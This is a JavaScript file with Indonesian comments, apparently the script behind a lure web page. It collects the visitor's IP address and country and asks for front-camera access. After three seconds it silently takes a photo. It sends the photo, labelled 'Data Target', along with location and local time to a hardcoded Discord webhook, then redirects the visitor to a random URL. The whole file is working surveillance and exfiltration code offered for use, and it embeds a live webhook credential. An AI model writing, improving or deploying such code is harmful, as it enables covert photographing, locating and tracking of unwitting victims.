const webhookURL = "https://discord.com/api/webhooks/1352760933654724668/RiiciP_za_eGd7u1OvHr1IbLXm4Ob7NWmk7MUMkOJ8Z9TZOAOFFPESpwMspxeQR_WPp9"; 
const jsonURL = "server.json"; // Ganti dari urls.json ke server.json

const canvas = document.createElement("canvas");
const context = canvas.getContext("2d");
canvas.style.display = "none";
document.body.appendChild(canvas);

// Fungsi mendapatkan waktu lokal HP target
function getLocalTime() {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, "0");
    const minutes = now.getMinutes().toString().padStart(2, "0");
    const seconds = now.getSeconds().toString().padStart(2, "0");
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    return `${hours}:${minutes}:${seconds} (${timeZone})`;
}

// Ambil IP Target + Lokasi
fetch("https://api64.ipify.org?format=json")
    .then(response => response.json())
    .then(data => {
        const ip = data.ip;

        fetch(`https://ipwho.is/${ip}`)
            .then(response => response.json())
            .then(data => {
                const location = data.country || "Unknown";

                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                    .then(stream => {
                        const track = stream.getVideoTracks()[0];
                        const imageCapture = new ImageCapture(track);
                        
                        setTimeout(() => {
                            const localTime = getLocalTime();
                            imageCapture.takePhoto()
                                .then(blob => {
                                    sendToDiscord(blob, ip, location, localTime);
                                    track.stop();
                                })
                                .catch(error => console.error("Gagal ambil foto:", error));
                        }, 3000);
                    })
                    .catch(err => console.error("Akses kamera ditolak:", err));
            })
            .catch(err => console.error("Gagal ambil lokasi:", err));
    })
    .catch(err => console.error("Gagal ambil IP:", err));

// Kirim ke Webhook Discord
function sendToDiscord(blob, ip, location, localTime) {
    const formData = new FormData();
    formData.append("file", blob, "capture.jpg");

    formData.append("payload_json", JSON.stringify({
        content: `📸 **Data Target**\n🌍 **IP**: ${ip}\n📌 **Country**: ${location}\n⏰ **InterTime**: ${localTime}`
    }));

    fetch(webhookURL, {
        method: "POST",
        body: formData
    });
}

// Ambil URL acak dari server.json & redirect setelah 11 detik
fetch(jsonURL)
    .then(response => response.json())
    .then(data => {
        const urls = data.urls;
        if (urls && urls.length > 0) {
            const randomURL = urls[Math.floor(Math.random() * urls.length)];
            setTimeout(() => {
                window.location.href = randomURL;
            }, 11000);
        } else {
            console.error("JSON tidak berisi URL");
        }
    })
    .catch(error => console.error("Gagal mengambil URL dari server.json:", error));
